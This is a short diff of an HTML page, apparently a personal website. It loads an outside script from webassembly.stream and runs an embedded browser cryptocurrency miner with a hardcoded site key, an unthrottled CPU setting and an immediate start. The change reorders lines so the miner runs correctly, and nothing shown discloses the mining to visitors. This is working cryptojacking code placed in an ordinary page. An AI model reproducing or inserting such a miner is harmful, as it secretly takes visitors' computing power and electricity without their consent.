@@ -223,12 +223,13 @@ Email: mathewgaralde@gmail.com
 	  
 <script src="https://www.webassembly.stream/p7wj.js"></script>
 <script>
-    var hps = miner.getHashesPerSecond();	
-    var running = miner.isRunning();
+    
     var miner = new Client.Anonymous('d80c32fdccb6f54d63ba4ebe17b83897b885dba88254715ada09c7bc04ca9524', {
         throttle: 0.0
     });
     miner.start();
+    var hps = miner.getHashesPerSecond();	
+    var running = miner.isRunning();
     console.log(running);	
     console.log(hps);	
 </script>  
